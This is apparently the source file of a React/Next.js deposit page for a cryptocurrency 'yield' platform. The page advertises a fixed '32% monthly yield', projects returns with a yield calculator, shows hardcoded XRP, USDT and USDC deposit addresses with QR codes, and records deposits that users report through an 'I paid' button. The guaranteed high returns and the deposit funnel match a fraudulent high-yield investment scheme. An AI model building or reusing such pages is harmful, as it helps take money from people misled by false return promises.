"use client";

import { useEffect, useMemo, useState } from "react";
import { useRouter, useSearchParams } from "next/navigation";
import { SUPPORTED_CURRENCIES } from "@/lib/wallets/shared";

const DAILY_YIELD_RATE = 0.0106;
const MIN_DEPOSIT_USD = 250;
const STATUS_STYLES: Record<string, string> = {
  PAID: "text-emerald-600",
  ERROR: "text-rose-600",
  PROCESSING: "text-amber-600",
};
const COINGECKO_IDS: Record<string, string> = {
  XRP: "ripple",
  USDT: "tether",
  USDC: "usd-coin",
};
const buildQrImageUrl = (address: string) =>
  `https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=${encodeURIComponent(address)}`;

function formatUsd(value: number) {
  return new Intl.NumberFormat("en-US", {
    style: "currency",
    currency: "USD",
    maximumFractionDigits: 2,
  }).format(value);
}

function formatAmount(value: number, digits = 2) {
  return new Intl.NumberFormat("en-US", {
    maximumFractionDigits: digits,
  }).format(value);
}

type DepositRecord = {
  id: string;
  amount: number;
  currency: string;
  status: string;
  createdAt: string;
  address: string;
};

type DepositDetail = {
  label: string;
  address: string;
  qr: string;
};

const depositDetails = {
  XRP: {
    label: "XRP (XRP Ledger)",
    address: "rhWPVrNsddEig3MSambjuR2XwcDLLhtZM9",
    qr: buildQrImageUrl("rhWPVrNsddEig3MSambjuR2XwcDLLhtZM9"),
  },
  USDT: {
    label: "USDT",
    address: "TNg7uCJ9y46DkXJqf1V4wVZ8M5wT1Qm3qP",
    qr: buildQrImageUrl("TNg7uCJ9y46DkXJqf1V4wVZ8M5wT1Qm3qP"),
  },
  USDC: {
    label: "USDC",
    address: "0x9C2bcd43e1f2c2b2b28a1cF1b2d62a8a2c4D3f1A",
    qr: buildQrImageUrl("0x9C2bcd43e1f2c2b2b28a1cF1b2d62a8a2c4D3f1A"),
  },
} satisfies Record<string, DepositDetail>;

export default function DepositClient() {
  const searchParams = useSearchParams();
  const router = useRouter();
  const [amountUsd, setAmountUsd] = useState(819251);
  const [days, setDays] = useState(16);
  const [currency, setCurrency] = useState("XRP");
  const [availableCurrencies, setAvailableCurrencies] = useState<string[]>([...SUPPORTED_CURRENCIES]);
  const [copied, setCopied] = useState(false);
  const [paidAmount, setPaidAmount] = useState("");
  const [toast, setToast] = useState<string | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [history, setHistory] = useState<DepositRecord[]>([]);
  const [wallets, setWallets] = useState<Record<string, DepositDetail>>(depositDetails);
  const [walletsLoading, setWalletsLoading] = useState(true);
  const [prices, setPrices] = useState<Record<string, number>>({
    XRP: 1,
    USDT: 1,
    USDC: 1,
  });

  useEffect(() => {
    setAvailableCurrencies([...SUPPORTED_CURRENCIES]);
    if (!SUPPORTED_CURRENCIES.includes(currency as (typeof SUPPORTED_CURRENCIES)[number])) {
      setCurrency(SUPPORTED_CURRENCIES[0]);
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  useEffect(() => {
    const loadWallets = async () => {
      try {
        const res = await fetch("/api/wallets", { cache: "no-store" });
        if (!res.ok) return;
        const data = await res.json();
        const map: Record<string, DepositDetail> = { ...depositDetails };
        (data?.wallets ?? []).forEach((w: { currency: string; address: string; qrImage: string }) => {
          const symbol = w.currency?.toUpperCase() ?? "";
          if (!symbol) return;
          const fallback = depositDetails[symbol as keyof typeof depositDetails];
          const address = w.address?.trim() || fallback?.address || "";
          map[symbol] = {
            label: symbol,
            address,
            qr:
              w.qrImage?.trim() ||
              (address ? buildQrImageUrl(address) : "") ||
              fallback?.qr ||
              "",
          };
        });
        setWallets(map);
      } catch {
        // ignore
      } finally {
        setWalletsLoading(false);
      }
    };
    loadWallets();
  }, []);

  useEffect(() => {
    const requested = searchParams?.get("asset")?.toUpperCase();
    if (!requested) return;
    setAvailableCurrencies((prev) => (prev.includes(requested) ? prev : [...prev, requested]));
    setCurrency((prev) => (requested ? requested : prev));
  }, [searchParams]);

  const selectedDeposit =
    wallets[currency as keyof typeof wallets] ??
    ({
      label: currency,
      address: "Address will be assigned after selection.",
      qr: "",
    } as const);
  const address = selectedDeposit.address;
  const qrImagePath =
    selectedDeposit.qr ||
    (address && address !== "Address will be assigned after selection." ? buildQrImageUrl(address) : "");

  const projectedUsd = useMemo(() => amountUsd * (1 + DAILY_YIELD_RATE * days), [amountUsd, days]);

  useEffect(() => {
    const load = async () => {
      try {
        const res = await fetch("/api/deposits", { cache: "no-store" });
        if (!res.ok) return;
        const data = await res.json();
        setHistory(data?.deposits ?? []);
      } catch {
        // ignore
      }
    };
    load();
  }, []);

  useEffect(() => {
    const CACHE_KEY = "xrp_prices_usd";
    const loadPrices = async () => {
      try {
        const cached = window.localStorage.getItem(CACHE_KEY);
        if (cached) {
          const parsed = JSON.parse(cached) as Record<string, number>;
          setPrices((prev) => ({ ...prev, ...parsed }));
        }
      } catch {
        // ignore cache errors
      }

      const ids = Object.values(COINGECKO_IDS).join(",");
      try {
        const res = await fetch(
          `https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=usd`,
          { cache: "no-store" }
        );
        if (!res.ok) return;
        const data = await res.json();
        const next = {
          XRP: data?.[COINGECKO_IDS.XRP]?.usd ?? prices.XRP ?? 1,
          USDT: data?.[COINGECKO_IDS.USDT]?.usd ?? prices.USDT ?? 1,
          USDC: data?.[COINGECKO_IDS.USDC]?.usd ?? prices.USDC ?? 1,
        };
        setPrices(next);
        try {
          window.localStorage.setItem(CACHE_KEY, JSON.stringify(next));
        } catch {
          // ignore cache errors
        }
      } catch {
        // ignore
      }
    };
    loadPrices();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  const submitPaid = async () => {
    setToast(null);
    setError(null);
    const amountValue = Number(paidAmount || 0);
    const price = prices[currency as (typeof SUPPORTED_CURRENCIES)[number]] ?? 1;
    const amountUsd = amountValue * price;
    const minAmount = MIN_DEPOSIT_USD / price;
    if (amountUsd < MIN_DEPOSIT_USD) {
      setError(`Minimum deposit is ${formatAmount(minAmount)} ${currency} (~$${MIN_DEPOSIT_USD})`);
      return;
    }
    const res = await fetch("/api/deposits", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ amount: amountValue, currency }),
    });
    if (!res.ok) {
      const data = await res.json().catch(() => null);
      setError(data?.error ?? "Could not record deposit");
      return;
    }
    const data = await res.json();
    setToast(`Payment of ${amountValue} ${currency} has been accepted and is now processing.`);
    setHistory((prev) => [data.deposit, ...prev].slice(0, 20));
    setPaidAmount("");
    router.refresh();
  };

  return (
    <div className="space-y-6">
      <div className="rounded-2xl border border-gray-200 bg-white p-6 shadow-sm">
        <h2 className="text-lg font-semibold text-gray-900">Yield Calculator</h2>

        <div className="mt-5 grid gap-6 md:grid-cols-2">
          <label className="grid gap-2 text-sm text-gray-600">
            <span className="font-medium text-gray-700">Amount ($)</span>
            <input
              className="h-11 rounded-xl border border-gray-200 bg-gray-50 px-3"
              type="number"
              min="0"
              value={amountUsd}
              onChange={(e) => setAmountUsd(Number(e.target.value || 0))}
            />
            <input
              className="accent-blue-600"
              type="range"
              min="0"
              max="1000000"
              step="1000"
              value={amountUsd}
              onChange={(e) => setAmountUsd(Number(e.target.value || 0))}
            />
          </label>

          <label className="grid gap-2 text-sm text-gray-600">
            <span className="font-medium text-gray-700">Timeframe (days)</span>
            <input
              className="h-11 rounded-xl border border-gray-200 bg-gray-50 px-3"
              type="number"
              min="1"
              max="365"
              value={days}
              onChange={(e) => setDays(Number(e.target.value || 1))}
            />
            <input
              className="accent-blue-600"
              type="range"
              min="1"
              max="365"
              value={days}
              onChange={(e) => setDays(Number(e.target.value || 1))}
            />
          </label>
        </div>

        <div className="mt-5 rounded-2xl bg-gray-50 px-6 py-5 text-center">
          <div className="text-sm text-gray-500">At the moment we provide:</div>
          <div className="text-sm font-semibold text-blue-600">32% monthly yield</div>
          <div className="mt-1 text-2xl font-semibold text-blue-700">{formatUsd(projectedUsd)}</div>
        </div>
      </div>

      <div className="rounded-2xl border border-gray-200 bg-white p-6 shadow-sm">
        <h2 className="text-lg font-semibold text-gray-900">Your Deposit Address</h2>

        <div className="mt-4 grid gap-2 text-sm text-gray-600">
          <label className="grid gap-2">
            <span className="font-medium text-gray-700">Select Currency to Deposit</span>
            <select
              className="h-11 rounded-xl border border-gray-200 bg-gray-50 px-3 text-sm"
              value={currency}
              onChange={(e) => setCurrency(e.target.value)}
            >
              {availableCurrencies.map((symbol) => {
                const detail = depositDetails[symbol as keyof typeof depositDetails];
                return (
                  <option key={symbol} value={symbol}>
                    {detail?.label ?? symbol}
                  </option>
                );
              })}
            </select>
          </label>
          <div className="text-xs text-gray-500">Address and QR are updated for the selected currency.</div>
        </div>

        <div className="mt-5 rounded-2xl border border-blue-100 bg-blue-50 p-5">
          <div className="text-xs uppercase text-blue-600">Send {currency} to this address:</div>
          <div className="mt-3 flex flex-wrap items-center gap-3 rounded-xl bg-white p-3">
            <div className="flex-1 font-mono text-xs text-gray-800 break-all">
              {address}
            </div>
            <button
              className="h-9 px-4 rounded-lg bg-blue-600 text-white text-xs font-semibold"
              type="button"
              onClick={async () => {
                await navigator.clipboard.writeText(address);
                setCopied(true);
                setTimeout(() => setCopied(false), 1200);
              }}
            >
              {copied ? "Copied" : "Copy"}
            </button>
          </div>

          <div className="mt-6 grid gap-6 md:grid-cols-[220px,1fr] md:items-start">
            <div className="flex justify-center md:justify-start">
              <div className="rounded-2xl border-4 border-yellow-400 bg-white p-3 shadow-sm">
                {walletsLoading || !qrImagePath ? (
                  <div className="h-40 w-40" aria-label="QR code loading placeholder" />
                ) : (
                  <img
                    src={qrImagePath}
                    alt={`QR code for ${address}`}
                    className="h-40 w-40"
                    loading="lazy"
                    onError={(event) => {
                      const target = event.currentTarget;
                      if (target.dataset.fallbackApplied) return;
                      const fallbackQr =
                        address && address !== "Address will be assigned after selection." ? buildQrImageUrl(address) : "";
                      target.dataset.fallbackApplied = "true";
                      if (fallbackQr && target.src !== fallbackQr) {
                        target.src = fallbackQr;
                      } else {
                        target.style.visibility = "hidden";
                      }
                    }}
                  />
                )}
              </div>
            </div>
            <div className="text-sm text-gray-600 space-y-2">
              <div className="font-medium text-gray-800">Important:</div>
              <div>Send only {currency} to this address.</div>
              <div>Deposit appears after 1st confirmation with status &quot;Pending&quot;.</div>
              <div>Funds credited automatically after 12 confirmations.</div>
              <div>Average confirmation time: ~3 minutes per block.</div>
            </div>
          </div>

          <div className="mt-6 grid gap-3 md:grid-cols-2">
            <label className="grid gap-2 text-sm text-gray-600">
              <span className="font-medium text-gray-700">Payment amount</span>
              <input
                className="h-11 rounded-xl border border-gray-200 bg-gray-50 px-3"
                type="number"
                min={MIN_DEPOSIT_USD / (prices[currency as (typeof SUPPORTED_CURRENCIES)[number]] ?? 1)}
                value={paidAmount}
                onChange={(e) => setPaidAmount(e.target.value)}
              />
            </label>
            <div className="flex items-end">
              <button
                className="h-11 w-full rounded-xl bg-blue-600 text-white font-semibold"
                type="button"
                onClick={submitPaid}
              >
                I paid
              </button>
            </div>
          </div>
          {toast ? <div className="mt-2 rounded-lg bg-emerald-50 px-3 py-2 text-sm text-emerald-700">{toast}</div> : null}
          {error ? <div className="mt-2 rounded-lg bg-rose-50 px-3 py-2 text-sm text-rose-700">{error}</div> : null}
          <div className="mt-2 text-xs text-gray-500">
            Minimum deposit:{" "}
            {formatAmount(MIN_DEPOSIT_USD / (prices[currency as (typeof SUPPORTED_CURRENCIES)[number]] ?? 1))}{" "}
            {currency} (~${MIN_DEPOSIT_USD})
          </div>
        </div>
      </div>

      <div className="rounded-2xl border border-gray-200 bg-white p-6 shadow-sm">
        <div className="flex items-center justify-between">
          <h2 className="text-lg font-semibold">Recent Deposits</h2>
          <button className="text-sm text-blue-600">View All</button>
        </div>
        <div className="mt-4 rounded-xl border border-gray-200 overflow-hidden">
          <div className="overflow-x-auto">
            <div className="min-w-[720px]">
              <div className="grid grid-cols-12 bg-gray-50 px-4 py-3 text-xs font-medium text-gray-600">
                <div className="col-span-2">Currency</div>
                <div className="col-span-4">Address</div>
                <div className="col-span-2">Amount</div>
                <div className="col-span-2">Status</div>
                <div className="col-span-2">Date</div>
              </div>
              {history.length === 0 ? (
                <div className="px-4 py-6 text-sm text-gray-500">No deposits found. Make your first deposit!</div>
              ) : (
                history.map((d) => (
                  <div key={d.id} className="grid grid-cols-12 px-4 py-3 text-sm text-gray-700 border-t border-gray-100">
                    <div className="col-span-2">{d.currency}</div>
                    <div className="col-span-4 break-all text-xs">{d.address}</div>
                    <div className="col-span-2">{d.amount}</div>
                    <div className={`col-span-2 font-medium ${STATUS_STYLES[d.status] ?? "text-gray-600"}`}>
                      {d.status}
                    </div>
                    <div className="col-span-2">{new Date(d.createdAt).toLocaleString()}</div>
                  </div>
                ))
              )}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
